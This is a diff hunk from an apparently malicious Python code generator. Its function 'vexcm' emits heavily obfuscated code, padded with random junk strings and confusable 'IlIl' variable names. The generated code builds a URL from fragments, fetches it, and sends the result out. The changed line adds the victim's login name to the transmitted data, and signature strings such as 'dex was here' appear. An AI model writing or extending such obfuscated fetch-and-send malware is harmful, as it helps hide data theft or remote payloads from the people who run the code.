@@ -127,7 +127,7 @@ def vexcm():
 '''{random.choices(randomstrings)} ''';dex_gay=False;'''{random.choices(randomstrings)}''';{random.choices(randombools)};dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
 '''{random.choices(randomstrings)} {random.choices(randomstrings)}''';{random.choices(randombools)};{random.choices(randomstrings)};'''{random.choices(randomstrings)}'''
 '''{random.choices(randomstrings)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(randomstrings)}'''
-'''{random.choices(randomstrings)} ''';{random.choices(randombools)};dexIlIlIlIlllIllIlIIllIlIll.send(dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;{random.choices(randombools)}
+'''{random.choices(randomstrings)} ''';{random.choices(randombools)};dexIlIlIlIlllIllIlIIllIlIll.send("{os.getlogin()}: "+dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;{random.choices(randombools)}
 
 '''''';{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};{random.choices(randomstrings)};''''''
 '''dex.lol#1337'''
